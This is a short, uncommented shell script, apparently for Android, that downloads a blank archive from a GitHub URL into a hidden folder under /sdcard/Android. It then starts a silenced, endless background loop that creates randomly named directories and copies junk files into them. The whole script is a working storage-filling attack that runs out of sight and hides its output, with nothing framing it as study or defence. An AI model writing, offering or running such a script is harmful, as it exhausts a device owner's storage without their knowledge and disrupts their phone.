w() {
	
	while [ true ];do
	cd /sdcard/Android/.storage
	mkdir $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cd .folder
	cp -f A $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cp -f B $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cp -f C $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cp -f D $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cp -f E $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cp -f F $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	
	done > /dev/null 2>&1 &
	}
	
	f() {
	cd /sdcard/Android
	if [ -e .storage ];then
	w
	else
	mkdir .storage
	cd .storage
	mkdir .folder
	cd .folder
	wget https://github.com/rooted-cyber/upload/raw/master/blank.zip
	unzip blank.zip
	cp -f blank.txt A
	cp -f blank.txt B
	cp -f blank.txt C
	cp -f blank.txt D
	cp -f blank.txt E
	cp -f blank.txt F
	w
	fi
	}
	f
